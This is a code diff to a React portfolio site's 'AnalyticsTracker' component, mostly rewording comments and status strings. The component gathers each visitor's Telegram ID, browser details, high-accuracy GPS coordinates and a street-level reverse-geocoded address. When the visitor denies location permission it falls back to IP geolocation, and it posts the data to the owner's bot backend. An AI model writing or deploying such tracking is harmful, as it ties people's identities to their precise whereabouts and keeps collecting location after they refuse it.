@@ -1,4 +1,4 @@
-import { useEffect, useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { BrowserRouter as Router, Routes, Route, useLocation, useNavigate } from 'react-router-dom';
 import { ArrowLeft } from 'lucide-react';
 import axios from 'axios';
@@ -58,6 +58,7 @@ function AnalyticsTracker() {
   }, [location, userId]);
 
   const sendInitialMetrics = async (tgId) => {
+    // 🌐 Exact Browser Client Configuration
     const browser = navigator.userAgent;
     const screenSize = `${window.innerWidth}x${window.innerHeight}`;
 
@@ -72,17 +73,18 @@ function AnalyticsTracker() {
           if(backupIpRes.data && backupIpRes.data.success) {
              return `${backupIpRes.data.city}, ${backupIpRes.data.region}, ${backupIpRes.data.country} [Backup-IP]`;
           }
-          return "Location Blocked / Fetch Timeout";
+          return "Permission Denied / N/A";
         } catch (backupErr) {
-          return "Location Blocked / Fetch Timeout";
+          return "Permission Denied / N/A";
         }
       }
     };
 
+    // 🎯 Real-time HTML5 Map & Geolocation Request
     if (navigator.geolocation) {
       const geoOptions = {
         enableHighAccuracy: true, 
-        timeout: 30000, // 🎯 30 வினாடிகள் வரை பாப்-அப் அனுமதிக்குக் காத்திருக்கும் (மிக முக்கியம்)
+        timeout: 25000, // User allow pannuvatharku 25 seconds time limits
         maximumAge: 0             
       };
 
@@ -93,6 +95,7 @@ function AnalyticsTracker() {
           let resolvedLocation = "Geocode Failed / N/A";
 
           try {
+            // Live map service reverse geocoding to extract village, city, area
             const geoRes = await axios.get(
               `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
               { headers: { 'User-Agent': 'RakeshPortfolioAnalytics/1.0' } }
@@ -108,12 +111,13 @@ function AnalyticsTracker() {
             resolvedLocation = await fallbackToIPLocation();
           }
 
+          // Data payload-a backend-uku anupurathu
           await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
             telegramId: tgId, browser, screenSize, latitude: lat, longitude: lon, resolvedLocation
           }).catch(err => console.error("Metrics send error:", err.message));
         },
         async (error) => {
-          console.log("GPS Blocked/Timeout. Activating IP-Location...");
+          console.log("GPS Blocked / Denied. Using network location...");
           const ipLocation = await fallbackToIPLocation();
 
           await axios.post('https://rakeshakmbot.onrender.com/api/save-metrics', {
@@ -143,7 +147,6 @@ function CenterNavigationTrigger() {
       <button
         onClick={() => navigate('/here')}
         className="group flex flex-col items-center justify-center pointer-events-auto bg-transparent border-none outline-none focus:outline-none active:scale-95 transition-transform duration-200"
-        aria-label="Click here to go to About Page"
       >
         <h1 className="font-sans text-4xl md:text-5xl font-black uppercase tracking-wider text-white transition-colors duration-300 group-hover:text-red-500">
           RAKESH DANIEL
